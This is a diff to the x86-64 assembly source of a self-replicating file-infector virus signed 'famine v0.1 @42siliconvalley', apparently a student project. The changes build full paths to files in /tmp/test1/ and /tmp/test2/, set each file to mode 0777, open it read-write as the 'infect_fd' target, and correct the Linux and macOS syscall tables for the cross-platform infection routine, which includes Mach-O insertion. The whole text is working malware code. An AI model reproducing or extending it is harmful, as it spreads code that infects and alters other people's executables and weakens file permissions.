@@ -66,17 +66,9 @@ _start:
                 mov         rsi, O_RDONLY | O_DIRECTORY
                 mov         rax, __NR_open
                 translate_syscall
-                test        rax, rax
-                jl          .nextdir
+                jc          .nextdir                            ;XXX expecting carry flag if syscall fails
 
                 mov         [rsp-0x30], rax                     ;rsp-0x30 = directory_fd
-
-                mov         rdi, rax
-                mov         rax, __NR_fchdir
-                translate_syscall
-                test        rax, rax
-                jnz         .closedir
-
 
 .readdir:       lea         r10, [rsp-0x28]                     ;long *basep for macos
                 mov         rdx, BUF_SIZE
@@ -139,12 +131,32 @@ _start:
 
                 jmp         rax
 
-process:                                                         ; expecting filename in rdi
+process:                                                        ; expecting filename in rdi
+                                                                ; directory in r14
+                mov         rsi, r14
+                mov         rax, rdi
+                lea         rdi, [rsp - ((BUF_SIZE * 2) + LOCAL_VARS)]
+                mov         rdx, rdi                            ; concat directory and filename
+
+.dirname:       movsb
+                cmp         byte [rsi], 0
+                jnz         .dirname
+                mov         rsi, rax
+.filename:      movsb
+                cmp         byte [rsi - 1], 0
+                jnz         .filename
+                mov         rdi, rdx
+
+                push        rdi
+                mov         rsi, 0o777
+                mov         rax, __NR_chmod                     ; try to set permissions
+                translate_syscall
+                pop         rdi
+
                 mov         rsi, O_RDWR
                 mov         rax, __NR_open
                 translate_syscall
-                test        rax, rax
-                jl          .return
+                jc          .return                             ; XXX expecting carry flag if open() fails
 
                 mov         [rsp-0x48], rax                     ; rsp-0x48 = infect_fd
 
@@ -373,8 +385,8 @@ insert_macho64:                                                 ; expecting data
                 ret
 
 
-linux_syscalls          db 0x02, 0x03, 0x05, 0x09, 0x0b, 0x4e, 0x51
-darwin_syscalls         db 0x05, 0x06, 0xbd, 0xc5, 0x49, 0xc4, 0x0d
+linux_syscalls          db 0x02, 0x03, 0x05, 0x09, 0x0b, 0x4e, 0x5a
+darwin_syscalls         db 0x05, 0x06, 0xbd, 0xc5, 0x49, 0xc4, 0x0f
 %define num_syscalls    7
 
 _translate_syscall:                                             ; expecting r15 == 0 on linux
@@ -394,7 +406,7 @@ _translate_syscall:                                             ; expecting r15 
                 ret
 
 
-slash_tmp   db "/tmp/test1",0,"/tmp/test2",0,0
+slash_tmp   db "/tmp/test1/",0,"/tmp/test2/",0,0
 signature   db "famine v0.1 @42siliconvalley",0
 
 _platform:
